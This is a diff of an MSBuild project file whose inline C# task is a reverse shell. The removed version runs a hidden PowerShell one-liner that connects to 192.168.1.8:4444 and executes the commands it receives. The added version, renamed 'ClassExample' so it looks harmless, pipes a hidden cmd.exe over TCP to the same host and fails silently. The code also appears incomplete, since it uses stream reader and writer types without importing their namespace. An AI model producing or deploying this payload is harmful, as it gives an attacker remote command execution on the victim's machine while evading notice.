@@ -1,40 +1,75 @@
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <Target Name="Shell">
-    <PowerShellReverseShell />
+  <Target Name="MSBuild">
+    <ClassExample />
   </Target>
-  
-  <UsingTask TaskName="PowerShellReverseShell" TaskFactory="CodeTaskFactory" 
-             AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+  <UsingTask
+    TaskName="ClassExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
       <Code Type="Class" Language="cs">
         <![CDATA[
         using System;
+        using System.Net.Sockets;
+        using System.Text;
         using System.Diagnostics;
-        using System.ComponentModel;
-        using System.Threading;
-
-        public class PowerShellReverseShell : Microsoft.Build.Utilities.Task {
-            public override bool Execute() {
-                // Run in background thread
-                Thread thread = new Thread(new ThreadStart(RunReverseShell));
-                thread.IsBackground = true;
-                thread.Start();
-                return true;
-            }
-            
-            private void RunReverseShell() {
-                try {
-                    ProcessStartInfo psi = new ProcessStartInfo();
-                    psi.FileName = "powershell.exe";
-                    psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('192.168.1.8',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"";
-                    psi.CreateNoWindow = true;
-                    psi.WindowStyle = ProcessWindowStyle.Hidden;
-                    psi.UseShellExecute = false;
+        using System.Runtime.InteropServices;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+        
+        public class ClassExample : Task, ITask
+        {
+            public override bool Execute()
+            {
+                try
+                {
+                    string host = "192.168.1.8";
+                    int port = 4444;
                     
-                    Process.Start(psi);
-                } catch {
+                    using (TcpClient client = new TcpClient(host, port))
+                    {
+                        using (NetworkStream stream = client.GetStream())
+                        using (StreamReader reader = new StreamReader(stream))
+                        using (StreamWriter writer = new StreamWriter(stream))
+                        {
+                            StringBuilder inputBuilder = new StringBuilder();
+                            Process process = new Process();
+                            process.StartInfo.FileName = "cmd.exe";
+                            process.StartInfo.CreateNoWindow = true;
+                            process.StartInfo.UseShellExecute = false;
+                            process.StartInfo.RedirectStandardOutput = true;
+                            process.StartInfo.RedirectStandardInput = true;
+                            process.StartInfo.RedirectStandardError = true;
+                            process.OutputDataReceived += (s, e) => {
+                                if (!string.IsNullOrEmpty(e.Data))
+                                {
+                                    writer.WriteLine(e.Data);
+                                    writer.Flush();
+                                }
+                            };
+                            
+                            process.Start();
+                            process.BeginOutputReadLine();
+                            
+                            // Command loop
+                            while (true)
+                            {
+                                inputBuilder.Clear();
+                                string input = reader.ReadLine();
+                                if (string.IsNullOrEmpty(input)) continue;
+                                if (input.ToLower() == "exit") break;
+                                
+                                process.StandardInput.WriteLine(input);
+                                System.Threading.Thread.Sleep(100);
+                            }
+                        }
+                    }
+                }
+                catch (Exception ex)
+                {
                     // Silent failure
                 }
+                return true;
             }
         }
         ]]>
